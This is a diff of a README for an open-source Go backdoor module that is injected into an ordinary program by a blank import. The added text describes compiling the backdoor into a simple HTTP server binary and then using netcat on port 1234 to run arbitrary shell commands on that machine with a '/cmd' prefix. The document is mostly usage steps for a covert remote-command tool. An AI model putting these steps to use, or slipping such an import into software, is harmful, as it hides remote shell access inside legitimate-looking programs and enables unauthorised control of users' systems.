@@ -6,11 +6,12 @@ Backdoor with Golang (Cross-Plateform)
 
 _/!\ Work in progress, not a stable release /!\_
 
-##Main goal
+## Main goal
 
 Forked from pilebones/backdoorGolang.
 Changed from CLI interface to a golang module.
 User should just import the module:
+
 `import _ "github.com/guimagalhaes/backdoorGolang/core/socket/server"`
 
 A fork of my own project named : "pilebones/backdoorBash" (see: https://github.com/pilebones/backdoorBash) but instead of using Bash as programming language (Unix-like only) this new one will work on Windows too by using a Golang API (cross-plateform) developed from scratch (as much as possible).
@@ -20,11 +21,13 @@ A fork of my own project named : "pilebones/backdoorBash" (see: https://github.c
 - Golang SDK : Compiler and tools for the Go programming language from Google (see: https://golang.org/doc/install)
 
 From Arch Linux :
+
 ```bash
 (sudo) pacman -S community/go
 ```
 
 From Debian :
+
 ```bash
 (sudo) apt-get install golang-go
 ```
@@ -33,9 +36,27 @@ From Debian :
 
 ```bash
 cd $GOPATH
-go get github.com/guimagalhaes/backdoorGolang
+go get github.com/guimagalhaes/backdoorGolang@v0.2.1
 ```
 
+## Run test example
+Go to tests/simple_example, remove the inject_backdoor.go file and build it:
+
+`go build`
+
+Execute the binary './simple_example' and see that only a simple HTTP server is available:
+
+`curl http://localhost:2020/hello`
+
+Restore the inject_backdoor.go file and build it again:
+
+```
+git checkout inject_backdoor.go
+go build
+```
+
+Execute the new binary ./simple_example and see that besides the simple HTTP server, the backdoor is now injected to the binary.
+Follow the next session to see how to test the infected version of the binary.
 
 ## Client
 
@@ -45,12 +66,21 @@ Use netcat
 netcat localhost 1234
 ```
 
-Then execute commands:
+Then execute a sequence of shell commands using '/cmd ' as prefix:
+
+```
 /cmd ls -l
 /cmd ss -natp
+...
+```
 
-To exit:
+To exit the netcat session:
+
+```
 /quit
+<enter>
+<enter>
+```
 
 ### Instructions
 
@@ -65,7 +95,9 @@ This instruction permit to logout the current user
 /quit
 /exit
 ```
+
 Example :
+
 ```bash
 echo "/quit"|netcat localhost 1234
 ```
@@ -77,7 +109,9 @@ This instruction permit to execute shell command from server. (OS supported : Li
 ```bash
 /cmd <shell-command>
 ```
+
 Example :
+
 ```bash
 echo "/cmd ls -l"|netcat localhost 1234
 ```
